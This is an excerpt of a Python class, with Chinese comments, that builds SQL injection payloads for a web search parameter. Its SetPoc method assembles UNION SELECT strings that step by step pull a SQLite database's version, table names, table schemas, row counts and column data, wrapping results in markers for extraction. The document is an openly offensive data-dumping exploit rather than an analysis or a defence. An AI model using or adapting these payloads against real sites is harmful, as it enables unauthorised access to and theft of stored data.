...
class DataBase():
    ...
    def SetPoc(self, action):
        ...
        # 获取order by 数目的poc
        if action == "orderby":
            poc0 = "?search=2018&q=&pageIndex=1&searchname=&_=1522659"
            poc_start = "?search=2018%') "
            poc_end = "--&q=&pageIndex=1&searchname=&_=1522659"
        ...
        # 获取版本信息的poc
            ...
            verpoc_start = "?search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||sqlite_version()||'</xxoo>'"
            verpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659"
        ...
        # 获取表数量的poc
            ...
            tabnumpoc_start = "?search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            tabnumpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659"
            tabnumpoc = tabnumpoc_start + self.poc_mid + tabnumpoc_end
            return tabnumpoc

        # 获取所有表名的poc
        elif action == "tables":
            tablespoc_start = "?search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||name||'</xxoo>'"
            tablespoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659".format(self.table_num)
            tablespoc = tablespoc_start + self.poc_mid + tablespoc_end
            return tablespoc

        # 获取所有表结构的poc
        elif action == "columns":
            columnspoc_start = "search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||sql||'</xxoo>'"
            columnspoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659".format(self.table_num)
            columnspoc = columnspoc_start + self.poc_mid + columnspoc_end
            return columnspoc

        # 获取指定表数据条数的poc
        elif action == "datanum":
            datanumpoc_start = "search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            datanumpoc_end = " from {0}--&q=&pageIndex=1&searchname=&_=1522659".format(table_name)
            datanumpoc = datanumpoc_start + self.poc_mid + datanumpoc_end
            return datanumpoc

# 获取具体数据的poc
        elif action == "data":
            datapoc_start = "search=2018%') and 1=2 UNION SELECT null,'<xxoo>'||{0}||'</xxoo>'".format(column_name)
            datapoc_end = " from {0} limit 0,{1}--&q=&pageIndex=1&searchname=&_=1522659".format(table_name, self.column_num)
